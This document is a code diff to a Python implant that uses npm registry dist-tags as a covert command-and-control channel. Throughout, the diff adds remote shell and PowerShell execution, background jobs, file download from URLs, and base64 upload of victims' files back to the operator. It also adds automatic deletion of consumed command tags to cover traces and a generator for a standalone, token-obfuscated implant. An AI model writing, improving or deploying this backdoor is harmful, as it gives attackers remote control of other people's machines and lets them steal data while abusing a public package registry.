@@ -1,4 +1,22 @@
-"""Implant side: poll dist-tags, execute, write results back."""
+"""Implant side: poll dist-tags, execute, write results back.
+
+Command grammar::
+
+    <anything>                 run via the platform shell, in the persistent cwd
+    exec:<cmd> / sh:<cmd>      same, explicit
+    ps:<cmd>                   PowerShell (Windows) / pwsh (elsewhere)
+    cd:<path>                  change the persistent working directory
+    cd                         print the working directory
+    timeout:<sec>:<cmd>        run with a per-command timeout
+    bg:<cmd>                   start in the background, return a job id
+    jobs                       list background jobs
+    out:<id>                   current output of a job
+    kill:<id>                  terminate a job
+    dl:<url>:<path>            download a file
+    up:<path>[:<off>[:<len>]]  base64 of a file, or of a byte range
+    sleep:<sec>                change the poll interval
+    exit                       clear the channel and stop
+"""
 
 from __future__ import annotations
 
@@ -6,21 +24,50 @@ import base64
 import collections
 import json
 import os
+import platform
 import random
 import subprocess
 import sys
+import threading
 import time
 import urllib.error
 import urllib.request
 
 from . import (CMD_PREFIX, RES_PREFIX, HBT_PREFIX, TAG_VALUE, MAX_TAG_LEN,
                PREFIXES, _FRAME_OVERHEAD, _MAX_CHUNKS, _SCOPED)
-from . import API, UA, group_chunks, encode_payload, decode_tag, registry_path
+from . import (API, UA, group_chunks_with_id, encode_payload, decode_tag,
+               registry_path)
 
 DEFAULT_TIMEOUT = 30
-MAX_CAPTURE = 1000          # chars of stdout+stderr kept per command
-MAX_UPLOAD = 3000           # bytes per up: reply (base64 grows 4/3)
+MAX_TIMEOUT = 3600
+MAX_CAPTURE = 12000         # chars kept per reply; a reply spans up to 99 tags
+MAX_UPLOAD = 12000          # bytes per `up:` reply
 SEEN_CAP = 512              # tags remembered between polls
+RETRIES = 3                 # attempts per registry call
+AUTO_CLEAN = True           # delete consumed command tags (needs a token)
+WINDOWS = platform.system() == "Windows"
+
+
+class Job:
+    """One background command: output captured incrementally."""
+
+    __slots__ = ("id", "command", "proc", "buf", "state", "started")
+
+    def __init__(self, jid, command):
+        self.id = jid
+        self.command = command
+        self.proc = None
+        self.buf = []
+        self.state = "running"
+        self.started = time.time()
+
+    def output(self):
+        return "".join(self.buf)[-MAX_CAPTURE:]
+
+    def summary(self):
+        age = int(time.time() - self.started)
+        rc = getattr(self.proc, "returncode", None)
+        return f"{self.id} {self.state} {age}s rc={rc} :: {self.command[:40]}"
 
 
 class Implant:
@@ -35,6 +82,10 @@ class Implant:
         self.seen: collections.OrderedDict[str, None] = collections.OrderedDict()
         self.n = 0
         self.dirty = 0
+        self.cwd = os.path.expanduser("~")
+        self.jobs: dict[str, Job] = {}
+        self.pending: dict[str, dict] = {}   # gid -> {total, parts} across polls
+        self._jobseq = 0
         safe = package.replace("/", "_").replace("@", "")
         appdata = os.environ.get("APPDATA") or os.environ.get("TEMP") \
             or os.path.expanduser("~")
@@ -82,9 +133,11 @@ class Implant:
         try:
             with open(self.state_file, encoding="utf-8") as f:
                 for line in f:
-                    line = line.strip()
-                    if line:
-                        self.seen[line] = None
+                    line = line.rstrip("\n")
+                    if line.startswith("cwd\t"):
+                        self.cwd = line[4:]
+                    elif line.strip():
+                        self.seen[line.strip()] = None
         except FileNotFoundError:
             return
         except OSError as e:
@@ -96,6 +149,7 @@ class Implant:
             os.makedirs(os.path.dirname(self.state_file), exist_ok=True)
             tmp = self.state_file + ".tmp"
             with open(tmp, "w", encoding="utf-8") as f:
+                f.write(f"cwd\t{self.cwd}\n")
                 for tag in self.seen:
                     f.write(tag + "\n")
             os.replace(tmp, self.state_file)      # atomic: no truncated state
@@ -112,22 +166,88 @@ class Implant:
     # ---------------------------------------------------------------- fetch
     def _fetch(self) -> dict:
         req = urllib.request.Request(self.url, headers={"User-Agent": UA})
-        with urllib.request.urlopen(req, timeout=15) as r:
-            data = json.loads(r.read())
-        if not isinstance(data, dict):
-            raise ValueError("registry returned no dist-tags object")
-        return data
+        last: BaseException | None = None
+        for attempt in range(RETRIES):
+            try:
+                with urllib.request.urlopen(req, timeout=15) as r:
+                    data = json.loads(r.read())
+                if not isinstance(data, dict):
+                    raise ValueError("registry returned no dist-tags object")
+                return data
+            except urllib.error.HTTPError as e:
+                last = e
+                if e.code in (429, 500, 502, 503, 504) and attempt + 1 < RETRIES:
+                    time.sleep(self._backoff(attempt, e))
+                    continue
+                raise
+            except (urllib.error.URLError, TimeoutError, ValueError) as e:
+                last = e
+                if attempt + 1 < RETRIES:
+                    time.sleep(self._backoff(attempt, None))
+                    continue
+                raise
+        raise last if last is not None else RuntimeError("fetch failed")
+
+    @staticmethod
+    def _backoff(attempt, err):
+        """Exponential backoff, honouring Retry-After when the server sends it."""
+        if err is not None and getattr(err, "headers", None):
+            wait = err.headers.get("Retry-After")
+            if wait:
+                try:
+                    return min(float(wait), 120.0)
+                except ValueError:
+                    pass
+        return min(2 ** attempt + random.uniform(0, 1), 60.0)
 
     def _parse(self, tags) -> list[str]:
+        """Assemble command payloads across polls, then retire their tags.
+
+        Chunks of one command can land in different polls: the registry
+        publishes tags in insertion order, Cloudflare may serve a stale map,
+        and an operator pushing a multi-tag command is several PUTs. A
+        ``fresh-only`` view would then never see a complete group, so partial
+        chunks are buffered in ``self.pending`` until the group closes.
+        """
         commands: list[str] = []
         fresh = [t for t in tags if t not in self.seen]
-        for buf, complete in group_chunks(fresh, CMD_PREFIX):
-            if not complete:
-                continue                          # wait for missing chunks
+        members: dict[str, list[str]] = {}
+        for tag in fresh:
+            if not tag.startswith(CMD_PREFIX):
+                continue
+            info = decode_tag(tag)
+            if not info:
+                continue
+            gid = info["gid"]
+            members.setdefault(gid, []).append(tag)
+            slot = self.pending.setdefault(gid, {"total": info["total"], "parts": {}})
+            if slot["total"] != info["total"]:
+                continue                       # inconsistent frame, ignore it
+            slot["parts"][info["index"]] = info["data"]
+
+        retire: set[str] = set()
+        for gid, slot in list(self.pending.items()):
+            total = slot["total"]
+            if len(slot["parts"]) != total:
+                continue                       # still waiting on chunks
+            buf = b"".join(slot["parts"][i] for i in range(1, total + 1))
             commands.append(buf.decode("utf-8", errors="replace"))
+            retire.update(members.get(gid, ()))
+            for tag in tags:                   # also retire chunks seen earlier
+                if tag.startswith(CMD_PREFIX):
+                    info = decode_tag(tag)
+                    if info and info["gid"] == gid:
+                        retire.add(tag)
+            del self.pending[gid]
+
         for tag in fresh:
             if tag.startswith(CMD_PREFIX):
                 self._remember(tag)
+        # Retire a whole group once it has run, so the tag map does not grow
+        # without bound (npm slows down as tags accumulate).
+        if AUTO_CLEAN and self.token:
+            for tag in retire:
+                self._del(tag)
         return commands
 
     # -------------------------------------------------------------- execute
@@ -136,6 +256,41 @@ class Implant:
             if cmd == "exit":
                 self._clean()
                 raise SystemExit(0)
+
+            if cmd == "cd":
+                return f"cwd={self.cwd}"
+
+            if cmd.startswith("cd:"):
+                target = cmd[3:].strip()
+                new = os.path.abspath(os.path.join(self.cwd, target))
+                if not os.path.isdir(new):
+                    return f"cd: no such directory {new}"
+                self.cwd = new
+                self._save()
+                return f"cwd={self.cwd}"
+
+            if cmd == "jobs":
+                if not self.jobs:
+                    return "no jobs"
+                return "\n".join(j.summary() for j in self.jobs.values())
+
+            if cmd.startswith("out:"):
+                jid = cmd.split(":", 1)[1].strip()
+                job = self.jobs.get(jid)
+                if job is None:
+                    return f"out: unknown job {jid!r}"
+                return f"[{job.summary()}]\n{job.output() or '(no output yet)'}"
+
+            if cmd.startswith("kill:"):
+                jid = cmd.split(":", 1)[1].strip()
+                job = self.jobs.get(jid)
+                if job is None:
+                    return f"kill: unknown job {jid!r}"
+                self._kill(job)
+                return f"killed {jid}"
+
+            if cmd.startswith("bg:"):
+                return self._spawn_bg(cmd[3:].strip())
 
             if cmd.startswith("sleep:"):
                 raw = cmd.split(":", 1)[1]
@@ -160,24 +315,106 @@ class Implant:
             if cmd.startswith("up:"):
                 return self._upload(cmd.split(":", 1)[1])
 
-            body = cmd[5:] if cmd.startswith("exec:") else cmd
-            if not body.strip():
-                return "(empty command)"
-            r = subprocess.run(body, shell=True, capture_output=True,
-                               timeout=DEFAULT_TIMEOUT)
-            out = r.stdout.decode(errors="replace")
-            err = r.stderr.decode(errors="replace")
-            combined = (out + err).strip() or "(ok)"
-            if len(combined) > MAX_CAPTURE:
-                cut = len(combined) - MAX_CAPTURE
-                combined = combined[:MAX_CAPTURE] + f"\n[truncated {cut} chars]"
-            return combined
-        except subprocess.TimeoutExpired:
-            return f"(timeout after {DEFAULT_TIMEOUT}s)"
+            timeout = DEFAULT_TIMEOUT
+            body = cmd
+            if body.startswith("timeout:"):
+                _, _, rest = body.partition(":")
+                raw, sep, tail = rest.partition(":")
+                if not sep or not raw.isdigit():
+                    return "timeout: expected timeout:<seconds>:<command>"
+                timeout = max(1, min(int(raw), MAX_TIMEOUT))
+                body = tail
+
+            shell = None
+            if body.startswith("ps:"):
+                body, shell = body[3:], "powershell"
+            elif body.startswith("exec:"):
+                body = body[5:]
+            elif body.startswith("sh:"):
+                body = body[3:]
+
+            return self._run(body, timeout, shell)
         except SystemExit:
             raise
         except Exception as e:                          # noqa: BLE001
             return f"({type(e).__name__}: {e})"
+
+    def _run(self, body, timeout=DEFAULT_TIMEOUT, shell=None):
+        if not body.strip():
+            return "(empty command)"
+        try:
+            if shell == "powershell":
+                argv = self._ps_argv(body)
+            else:
+                argv = self._shell_argv(body)
+            r = subprocess.run(argv, cwd=self.cwd, capture_output=True,
+                               timeout=timeout, stdin=subprocess.DEVNULL)
+        except subprocess.TimeoutExpired:
+            return f"(timeout after {timeout}s)"
+        except FileNotFoundError as e:
+            return f"(interpreter not found: {e})"
+        out = r.stdout.decode(errors="replace")
+        err = r.stderr.decode(errors="replace")
+        combined = (out + err).strip()
+        if len(combined) > MAX_CAPTURE:
+            cut = len(combined) - MAX_CAPTURE
+            combined = combined[:MAX_CAPTURE] + f"\n[truncated {cut} chars]"
+        prefix = "" if r.returncode == 0 else f"[rc={r.returncode}] "
+        return f"{prefix}{combined or '(no output)'}"
+
+    @staticmethod
+    def _shell_argv(body):
+        """The platform shell, named explicitly instead of shell=True.
+
+        Same behaviour as ``shell=True`` on POSIX (``/bin/sh -c``) but the argv
+        is auditable, stdin is not inherited, and no second quoting pass is
+        applied to ``body``.
+        """
+        if WINDOWS:
+            return ["cmd.exe", "/c", body]
+        return ["/bin/sh", "-c", body]
+
+    @staticmethod
+    def _ps_argv(body):
+        exe = "powershell.exe" if WINDOWS else "pwsh"
+        return [exe, "-NoProfile", "-NonInteractive", "-Command", body]
+
+    def _spawn_bg(self, body):
+        if not body:
+            return "bg: expected bg:<command>"
+        self._jobseq += 1
+        jid = f"j{self._jobseq}"
+        job = Job(jid, body)
+        self.jobs[jid] = job
+
+        def worker():
+            try:
+                job.proc = subprocess.Popen(
+                    self._shell_argv(body), cwd=self.cwd,
+                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                    stdin=subprocess.DEVNULL, text=True, errors="replace",
+                    bufsize=1)
+                for line in job.proc.stdout:
+                    job.buf.append(line)
+                    if sum(len(x) for x in job.buf) > MAX_CAPTURE * 2:
+                        job.buf = ["".join(job.buf)[-MAX_CAPTURE:]]
+                job.proc.wait()
+                job.state = "done"
+            except Exception as e:                      # noqa: BLE001
+                job.buf.append(f"\n({type(e).__name__}: {e})")
+                job.state = "failed"
+
+        threading.Thread(target=worker, daemon=True).start()
+        return f"job {jid} started: {body[:40]}"
+
+    @staticmethod
+    def _kill(job):
+        if job.proc is not None and job.proc.poll() is None:
+            try:
+                job.proc.terminate()
+            except OSError:
+                pass
+        job.state = "killed"
 
     @staticmethod
     def _split_dl(rest):
@@ -207,7 +444,9 @@ class Implant:
         return rest.find(":", start)
 
     def _dl(self, url, path):
-        with urllib.request.urlopen(url, timeout=30) as r:
+        if not os.path.isabs(path):
+            path = os.path.join(self.cwd, path)
+        with urllib.request.urlopen(url, timeout=60) as r:
             data = r.read()
         parent = os.path.dirname(os.path.abspath(path))
         os.makedirs(parent, exist_ok=True)
@@ -215,19 +454,31 @@ class Implant:
             f.write(data)
         return f"dl {len(data)}b -> {path}"
 
-    def _upload(self, path):
-        path = path.strip()
+    def _upload(self, spec):
+        """up:<path>[:<offset>[:<length>]] — base64 of the file or a byte range."""
+        parts = spec.split(":")
+        path = parts[0].strip()
         if not path:
             return "up: expected up:<path>"
+        if not os.path.isabs(path):
+            path = os.path.join(self.cwd, path)
         try:
+            offset = int(parts[1]) if len(parts) > 1 and parts[1] else 0
+            length = int(parts[2]) if len(parts) > 2 and parts[2] else MAX_UPLOAD
+        except ValueError:
+            return "up: offset and length must be integers"
+        length = max(1, min(length, MAX_UPLOAD))
+        try:
+            size = os.path.getsize(path)
             with open(path, "rb") as f:
-                raw = f.read(MAX_UPLOAD)
-                more = f.read(1)
+                f.seek(offset)
+                raw = f.read(length)
         except OSError as e:
             return f"up fail: {e}"
         data = base64.b64encode(raw).decode()
-        note = "+" if more else ""               # '+' marks a truncated read
-        return f"up {len(raw)}b{note}: {data}"
+        end = offset + len(raw)
+        more = "+" if end < size else ""
+        return f"up {offset}-{end}/{size}b{more}: {data}"
 
     # -------------------------------------------------------------- writeback
     def _reply(self, out):
@@ -248,19 +499,28 @@ class Implant:
         headers = {"User-Agent": UA, "Content-Type": "application/json"}
         if self.token:
             headers["Authorization"] = f"Bearer {self.token}"
-        req = urllib.request.Request(url, data=json.dumps(TAG_VALUE).encode(),
-                                     method="PUT", headers=headers)
-        try:
-            with urllib.request.urlopen(req, timeout=15) as r:
-                return 200 <= r.status < 300
-        except urllib.error.HTTPError as e:
-            if self.v:
-                print(f"[!] PUT {tag[:24]}: HTTP {e.code}", file=sys.stderr)
-            return False
-        except urllib.error.URLError as e:
-            if self.v:
-                print(f"[!] PUT {tag[:24]}: {e.reason}", file=sys.stderr)
-            return False
+        data = json.dumps(TAG_VALUE).encode()
+        for attempt in range(RETRIES):
+            req = urllib.request.Request(url, data=data, method="PUT",
+                                         headers=headers)
+            try:
+                with urllib.request.urlopen(req, timeout=20) as r:
+                    return 200 <= r.status < 300
+            except urllib.error.HTTPError as e:
+                if e.code in (429, 500, 502, 503, 504) and attempt + 1 < RETRIES:
+                    time.sleep(self._backoff(attempt, e))
+                    continue
+                if self.v:
+                    print(f"[!] PUT {tag[:24]}: HTTP {e.code}", file=sys.stderr)
+                return False
+            except urllib.error.URLError as e:
+                if attempt + 1 < RETRIES:
+                    time.sleep(self._backoff(attempt, None))
+                    continue
+                if self.v:
+                    print(f"[!] PUT {tag[:24]}: {e.reason}", file=sys.stderr)
+                return False
+        return False
 
     def _clean(self):
         if not self.token:
@@ -290,7 +550,8 @@ def generate_standalone(token=None, package=None):
     """Emit a dependency-free single-file implant."""
     import inspect
 
-    from . import deobfuscate_token as _deob, _xor as _xor_fn, _xor_key as _xor_key_fn
+    from . import (deobfuscate_token as _deob, _xor as _xor_fn,
+                   _xor_key as _xor_key_fn, group_chunks as _gc)
 
     obf = ""
     if token and package:
@@ -300,7 +561,8 @@ def generate_standalone(token=None, package=None):
     parts = [
         "#!/usr/bin/env python3",
         "import argparse, base64, binascii, collections, hashlib, json, os",
-        "import random, subprocess, sys, time, urllib.error, urllib.request",
+        "import platform, random, subprocess, sys, threading, time",
+        "import urllib.error, urllib.request",
         "",
         f"CMD_PREFIX = {CMD_PREFIX!r}",
         f"RES_PREFIX = {RES_PREFIX!r}",
@@ -314,9 +576,13 @@ def generate_standalone(token=None, package=None):
         f"_MAX_CHUNKS = {_MAX_CHUNKS}",
         f"_SCOPED = {_SCOPED!r}",
         f"DEFAULT_TIMEOUT = {DEFAULT_TIMEOUT}",
+        f"MAX_TIMEOUT = {MAX_TIMEOUT}",
         f"MAX_CAPTURE = {MAX_CAPTURE}",
         f"MAX_UPLOAD = {MAX_UPLOAD}",
         f"SEEN_CAP = {SEEN_CAP}",
+        f"RETRIES = {RETRIES}",
+        f"AUTO_CLEAN = {AUTO_CLEAN}",
+        f"WINDOWS = {WINDOWS}",
         "",
         inspect.getsource(_xor_key_fn),
         "",
@@ -330,7 +596,11 @@ def generate_standalone(token=None, package=None):
         "",
         inspect.getsource(decode_tag),
         "",
-        inspect.getsource(group_chunks),
+        inspect.getsource(_gc),
+        "",
+        inspect.getsource(group_chunks_with_id),
+        "",
+        inspect.getsource(Job),
         "",
         inspect.getsource(Implant),
         "",
